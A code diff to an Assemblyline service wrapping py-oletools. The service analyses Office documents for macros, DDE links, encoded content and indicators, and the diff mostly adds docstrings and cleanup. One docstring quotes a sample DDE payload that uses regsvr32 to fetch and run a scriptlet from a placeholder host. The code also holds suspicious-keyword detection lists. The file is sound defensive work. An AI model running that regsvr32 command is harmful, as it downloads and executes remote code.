@@ -1,4 +1,3 @@
-# wrapper service for py-oletools by Philippe Lagadec - http://www.decalage.info
 from textwrap import dedent
 
 from assemblyline.common.charset import safe_str
@@ -121,8 +120,9 @@ class Oletools(ServiceBase):
                                        """))
     SERVICE_CATEGORY = 'Static Analysis'
     SERVICE_ACCEPTS = 'document/office/.*|code/xml'
-    SERVICE_DESCRIPTION = "This service extracts metadata and network information and reports anomalies in " \
-                          "Microsoft OLE and XML documents using the Python library py-oletools."
+    SERVICE_DESCRIPTION = "This service extracts metadata, network information and reports anomalies in " \
+                          "Microsoft OLE and XML documents using the Python library py-oletools by Philippe " \
+                          "Lagadec - http://www.decalage.info"
     SERVICE_ENABLED = True
     SERVICE_VERSION = '3'
     SERVICE_REVISION = ServiceBase.parse_revision('$Id$')
@@ -142,7 +142,7 @@ class Oletools(ServiceBase):
     MAX_MACRO_SECTIONS = 3
     MIN_MACRO_SECTION_SCORE = SCORE.MED
 
-    # in addition to those from olevba.py
+    # In addition to those from olevba.py
     ADDITIONAL_SUSPICIOUS_KEYWORDS = ('WinHttp', 'WinHttpRequest', 'WinInet', 'Lib "kernel32" Alias')
 
     # Regex's
@@ -256,10 +256,18 @@ class Oletools(ServiceBase):
         return self._oletools_version
 
     def check_for_patterns(self, data, dataname):
+        """Use FrankenStrings module to find strings of interest.
+
+        Args:
+            data: Data to be searched.
+            dataname: Name of data to place in AL result header.
+
+        Returns:
+            AL result object and whether entity should be extracted (boolean).
+        """
         extract = 0
         ioc_res = None
 
-        # Use FrankenStrings modules to find other strings of interest
         # Plain IOCs
         if self.patterns:
             pat_strs = ["http://purl.org", "schemas.microsoft.com", "schemas.openxmlformats.org",
@@ -279,6 +287,7 @@ class Oletools(ServiceBase):
                                 or asc_asc in pat_whitelist:
                             continue
                         else:
+                            # Determine if entity should be extracted
                             extract += self.decide_extract(ty, asc_asc)
                             ioc_res.score += 1
                             ioc_res.add_line("Found %s string: %s in file %s}"
@@ -308,6 +317,15 @@ class Oletools(ServiceBase):
         return ioc_res, extract
 
     def check_for_b64(self, data, dataname):
+        """Search and decode base64 strings in sample data.
+
+        Args:
+            data: Data to be searched.
+            dataname: Name of data to place in AL result header.
+
+        Returns:
+            AL result object and whether entity was extracted (boolean).
+        """
         extract = False
         b64results = {}
         b64_extracted = set()
@@ -433,7 +451,7 @@ class Oletools(ServiceBase):
         return b64_res, extract
 
     def execute(self, request):
-
+        """Main Module. See README for details."""
         self.task = request.task
         request.result = Result()
         self.ole_result = request.result
@@ -458,6 +476,7 @@ class Oletools(ServiceBase):
             pass
 
         try:
+            self.check_for_indicators(path)
             self.check_for_dde_links(path)
             self.check_for_macros(filename, file_contents, request.sha256)
             self.check_xml_strings(path)
@@ -474,9 +493,6 @@ class Oletools(ServiceBase):
         for section in self.ole_result.sections:
             score_check += self.calculate_nested_scores(section)
 
-        #if score_check == 0 and not request.deep_scan:
-        #   request.result = Result()
-
         self.all_macros = None
         self.all_vba = None
 
@@ -484,6 +500,13 @@ class Oletools(ServiceBase):
         request.task.report_service_context(self._oletools_version)
 
     def check_for_indicators(self, filename):
+        """Finds and reports on indicator objects typically present in malicious files.
+
+        Args:
+            filename: Path to original OLE sample.
+        Returns:
+            None.
+        """
         # noinspection PyBroadException
         try:
             ole_id = OleID(filename)
@@ -498,19 +521,26 @@ class Oletools(ServiceBase):
 
                 if indicator.value is True:
                     if indicator.id in ("word", "excel", "ppt", "visio"):
-                        # good to know that the filetypes have been detected, but not a score-able offense
+                        # good to know that the file types have been detected, but not a score-able offense
                         indicator_score = SCORE.NULL
 
                     section = ResultSection(indicator_score, "OleID indicator : " + indicator.name)
                     if indicator.description:
                         section.add_line(indicator.description)
                     self.ole_result.add_section(section)
-        except:
+        except Exception:
             self.log.debug("OleID analysis failed for sample {}" .format(self.sha))
 
-    # Returns True if the URI should score
     # noinspection PyUnusedLocal
     def parse_uri(self, check_uri):
+        """Use regex to determine if URI valid and should be reported.
+
+        Args:
+            check_uri: Possible URI string.
+
+        Returns:
+            True if the URI should score and the URI match if found.
+        """
         m = re.match(self.URI_RE, check_uri)
         if m is None:
             return False, ""
@@ -556,8 +586,17 @@ class Oletools(ServiceBase):
 
         return scorable, m.group(0)
 
-    def decide_extract(self, ty, val):
+    @staticmethod
+    def decide_extract(ty, val):
+        """Determine if entity should be extracted by filtering for highly suspicious strings.
 
+        Args:
+            ty: IOC type.
+            val: String value.
+
+        Returns:
+            Boolean value.
+        """
         foi = ['APK', 'APP', 'BAT', 'BIN', 'CLASS', 'CMD', 'DAT', 'DLL', 'EXE', 'JAR', 'JS', 'JSE', 'LNK', 'MSI',
                'OSX', 'PAF', 'PS1', 'RAR', 'SCR', 'SWF', 'SYS', 'TMP', 'VBE', 'VBS', 'WSF', 'WSH', 'ZIP']
 
@@ -577,6 +616,14 @@ class Oletools(ServiceBase):
         return True
 
     def check_xml_strings(self, path):
+        """Search xml content for external targets, indicators, and base64 content.
+
+        Args:
+            path: Path to original sample.
+
+        Returns:
+            AL result object for target content, IOC content, base64 content.
+        """
         xml_target_res = ResultSection(score=SCORE.NULL, title_text="Attached External Template Targets in XML")
         xml_ioc_res = ResultSection(score=SCORE.NULL, title_text="IOCs content:")
         xml_b64_res = ResultSection(score=SCORE.NULL, title_text="Base64 content:")
@@ -648,9 +695,16 @@ class Oletools(ServiceBase):
 
     @staticmethod
     def sanitize_filename(filename, replacement='_', max_length=200):
-        """From rtfoby.py"""
-        """compute basename of filename. Replaces all non-whitelisted characters.
-           The returned filename is always a basename of the file."""
+        """From rtfoby.py. Compute basename of filename. Replaces all non-whitelisted characters.
+
+        Args:
+            filename: Path to original sample.
+            replacement: Character to replace non-whitelisted characters.
+            max_length: Maximum length of the file name.
+
+        Returns:
+           Sanitized basename of the file.
+        """
         basepath = os.path.basename(filename).strip()
         sane_fname = re.sub(r'[^\w\.\- ]', replacement, basepath)
 
@@ -671,6 +725,15 @@ class Oletools(ServiceBase):
 
     @staticmethod
     def verifySWF(f, x):
+        """Confirm that embedded flash content (SWF) has properties of the documented format.
+
+        Args:
+            f: Sample content.
+            x: Start of possible embedded flash content.
+
+        Returns:
+           Flash content if confirmed, or None.
+        """
         # Slightly modified code taken from oletools.thirdparty.xxpyswf verifySWF
         # Start of SWF
         f.seek(x)
@@ -698,6 +761,14 @@ class Oletools(ServiceBase):
             return None
 
     def extract_swf_objects(self, f):
+        """Search for embedded flash (SWF) content in sample.
+
+        Args:
+            f: Sample content.
+
+        Returns:
+           Flash content if found, or False.
+        """
         swf_found = False
         # Taken from oletools.thirdparty.xxpyswf disneyland module
         # def disneyland(f, filename, options):
@@ -720,6 +791,14 @@ class Oletools(ServiceBase):
         return swf_found
 
     def extract_vb_hex(self, encodedchunk):
+        """Attempts to convert possible hex encoding to ascii.
+
+        Args:
+            encodedchunk: Data that may contain hex encoding.
+
+        Returns:
+           True if hex content converted.
+        """
         decoded = ''
         try:
             while encodedchunk != '':
@@ -727,19 +806,26 @@ class Oletools(ServiceBase):
                 encodedchunk = encodedchunk[4:]
         except Exception:
             # If it fails, assuming not a real byte sequence
-            return  False
+            return False
         hex_md5 = hashlib.sha256(decoded).hexdigest()
         hex_path = os.path.join(self.working_directory, '{}.hex.decoded'.format(hex_md5))
         with open(hex_path, 'wb') as fh:
             fh.write(decoded)
-        self.request.add_extracted(hex_path, text="Flash file extracted during sample analysis")
+        self.request.add_extracted(hex_path, text="Large hex encoded chunks detected during sample analysis")
 
         return True
 
-    # chains.json contains common English trigraphs. We score macros on how common these trigraphs appear in code,
-    # skipping over some common keywords. A lower score indicates more randomized text, random variable/function names
-    # are common in malicious macros.
     def flag_macro(self, macro_text):
+        """Determine proportion of randomized text in macro using chains.json. chains.json contains English trigraphs.
+        We score macros on how commonly these trigraphs appear in code, skipping over some common keywords.
+
+        Args:
+            macro_text: Macro string content.
+
+        Returns:
+            True if the score is lower than self.macro_score_min_alert (indicating macro is possibly malicious).
+        """
+
         if self.macro_score_max_size is not None and len(macro_text) > self.macro_score_max_size:
             return False
 
@@ -769,9 +855,19 @@ class Oletools(ServiceBase):
             # these numbers are arbitrary, but if the sample is too short the score is worthless
             return False
 
+        # A lower score indicates more randomized text, random variable/function  names are common in malicious macros
         return (score / word_count) < self.macro_score_min_alert
 
     def create_macro_sections(self, request_hash):
+        """Creates result section for embedded macros of sample. Also extracts all macros and pcode content to
+        individual files (all_vba_[hash].vba and all_pcode_[hash].data).
+
+        Args:
+            request_hash: Original submitted sample's sha256hash.
+
+        Returns:
+           None.
+        """
         # noinspection PyBroadException
         try:
             filtered_macros = []
@@ -860,8 +956,15 @@ class Oletools(ServiceBase):
             section = ResultSection(SCORE.NULL, "OleVBA : Error parsing macros: {}".format(e))
             self.ole_result.add_section(section)
 
-
     def check_for_dde_links(self, filepath):
+        """Use msodde in OLETools to report on DDE links in document.
+
+        Args:
+            path: Path to original sample.
+
+        Returns:
+           None.
+        """
         # noinspection PyBroadException
         try:
             # TODO -- undetermined if other fields could be misused.. maybe do 2 passes, 1 filtered & 1 not
@@ -879,6 +982,15 @@ class Oletools(ServiceBase):
             self.ole_result.add_section(section)
 
     def process_dde_links(self, links_text, ole_section):
+        """Examine DDE links and report on malicious characteristics.
+
+        Args:
+            links_texts: DDE link text.
+            ole_section: OLE AL result section.
+
+        Returns:
+           None.
+        """
         ddeout_name = '{}.ddelinks.original'.format(self.request.sha256)
         ddeout_path = os.path.join(self.working_directory, ddeout_name)
         with open(ddeout_path, 'w') as fh:
@@ -896,7 +1008,7 @@ class Oletools(ServiceBase):
         "/c regsvr32 /u /n /s /i:\"h\"t\"t\"p://downloads.bad.com/file scrobj.dll" "For Security Reasons" 
         """
 
-        # to date haven't seen a sample with multiple links yet but it should be possible..
+        # To date haven't seen a sample with multiple links yet but it should be possible..
         dde_section = ResultSection(SCORE.MED, "MSO DDE Links:", body_format=TEXT_FORMAT.MEMORY_DUMP)
         dde_extracted = False
         looksbad = False
@@ -942,7 +1054,16 @@ class Oletools(ServiceBase):
             ole_section.add_section(dde_section)
 
     def check_for_macros(self, filename, file_contents, request_hash):
-        # noinspection PyBroadException
+        """Use VBA_Parser in Oletools to extract VBA content from sample.
+
+        Args:
+            filename: Path to original sample.
+            file_contents: Original sample file content.
+            request_hash: Original submitted sample's sha256hash.
+
+        Returns:
+           None.
+        """
         try:
             vba_parser = VBA_Parser(filename=filename, data=file_contents)
 
@@ -991,6 +1112,14 @@ class Oletools(ServiceBase):
                            .format(self.sha))
 
     def calculate_nested_scores(self, section):
+        """Calculate the sum of scores for entire AL result section (including subsections).
+
+        Args:
+            section: AL result section.
+
+        Returns:
+           Score as int.
+        """
         score = section.score
         if len(section.subsections) > 0:
             for subsection in section.subsections:
@@ -998,7 +1127,14 @@ class Oletools(ServiceBase):
         return score
 
     def macro_section_builder(self, vba_code):
+        """Build an AL result section for Macro (VBA code) content.
 
+        Args:
+            vba_code: VBA code for building result section.
+
+        Returns:
+           AL result object.
+        """
         vba_code_sha256 = hashlib.sha256(vba_code).hexdigest()
         macro_section = ResultSection(SCORE.NULL, "OleVBA : Macro detected")
         macro_section.add_line("Macro SHA256 : %s" % vba_code_sha256)
@@ -1040,10 +1176,16 @@ class Oletools(ServiceBase):
 
         return macro_section
 
-    # TODO: deobfuscator is very primitive; visual inspection and dynamic analysis will often be most useful
     # TODO: may want to eventually pull this out into a Deobfuscation helper that supports multi-languages
     def deobfuscator(self, text):
-        #self.log.debug("Deobfuscation running")
+        """Attempts to identify and decode multiple types of deobfuscation in VBA code.
+
+        Args:
+            text: Original VBA code.
+
+        Returns:
+           Original text, or deobfuscated text if specified techniques are detected.
+        """
         deobf = text
         # noinspection PyBroadException
         try:
@@ -1126,10 +1268,16 @@ class Oletools(ServiceBase):
 
         return deobf
 
-    #  note: we manually add up the score_section.score value here so that it is usable before the service finishes
-    #        otherwise it is not calculated until finalize() is called on the top-level ResultSection
     def macro_scorer(self, text):
-        #self.log.debug("Macro scorer running")
+        """Manually add up the score_section.score value so that it is usable before the service finishes,
+        otherwise it is not calculated until finalize() is called on the top-level ResultSection
+
+        Args:
+            text: Original VBA code.
+
+        Returns:
+           AL result section for VBA scoring (malicious properties).
+        """
         score_section = None
 
         try:
@@ -1208,6 +1356,14 @@ class Oletools(ServiceBase):
         return score_section
 
     def rip_mhtml(self, data):
+        """Parses and extracts ActiveMime Document(document/office/mhtml).
+
+        Args:
+            data: MHTML data.
+
+        Returns:
+            None.
+        """
         if self.task.tag != 'document/office/mhtml':
             return
 
@@ -1239,6 +1395,16 @@ class Oletools(ServiceBase):
             self.ole_result.add_section(mime_res)
 
     def process_ole10native(self, stream_name, data, streams_section):
+        """Parses ole10native data and reports on suspicious content.
+
+        Args:
+            stream_name: Name of OLE stream.
+            data: Ole10native data.
+            streams_section: Streams AL result section.
+
+        Returns:
+            None.
+        """
         suspicious = False
         sus_sec = ResultSection(SCORE.NULL, "Suspicious streams content:")
         try:
@@ -1298,6 +1464,15 @@ class Oletools(ServiceBase):
             return False
 
     def process_powerpoint_stream(self, data, streams_section):
+        """Parses powerpoint stream data and reports on suspicious characteristics.
+
+        Args:
+            data: Powerpoint stream data.
+            streams_section: Streams AL result section.
+
+        Returns:
+            None.
+        """
         try:
             powerpoint = PowerPointDoc(data)
             pp_line = "PowerPoint Document"
@@ -1332,9 +1507,17 @@ class Oletools(ServiceBase):
             return False
 
     def process_ole_stream(self, ole, streams_section):
+        """Parses OLE data and reports on metadata and suspicious properties.
 
+        Args:
+            data: OLE stream data.
+            streams_section: Streams AL result section.
+
+        Returns:
+            None.
+        """
         ole_tags = {
-            'title':'OLE_SUMMARY_TITLE',
+            'title': 'OLE_SUMMARY_TITLE',
             'subject': 'OLE_SUMMARY_SUBJECT',
             'author': 'OLE_SUMMARY_AUTHOR',
             'comments': 'OLE_SUMMARY_COMMENTS',
@@ -1423,7 +1606,6 @@ class Oletools(ServiceBase):
                 mal_msg = " FLAGGED MALICIOUS"
             clsid_sec.add_line("{}: {}{}" .format(ole_clsid, clsid_desc, mal_msg))
 
-
         if len(clsid_sec.body) > 0:
             streams_section.add_section(clsid_sec)
 
@@ -1449,7 +1631,6 @@ class Oletools(ServiceBase):
         hex_sec = ResultSection(SCORE.VHIGH, "VB hex notation:")
         sus_res = False
         sus_sec = ResultSection(SCORE.NULL, "Suspicious stream content:")
-
 
         ole_dir_examined = set()
         for direntry in ole.direntries:
@@ -1585,6 +1766,15 @@ class Oletools(ServiceBase):
 
     # noinspection PyBroadException
     def extract_streams(self, file_name, file_contents):
+        """Extracts OLE streams and reports on metadata and suspicious properties.
+
+        Args:
+            file_name: Path to original sample.
+            file_contents: Original sample file content.
+
+        Returns:
+            None.
+        """
         oles = {}
         try:
             streams_res = ResultSection(score=SCORE.NULL,
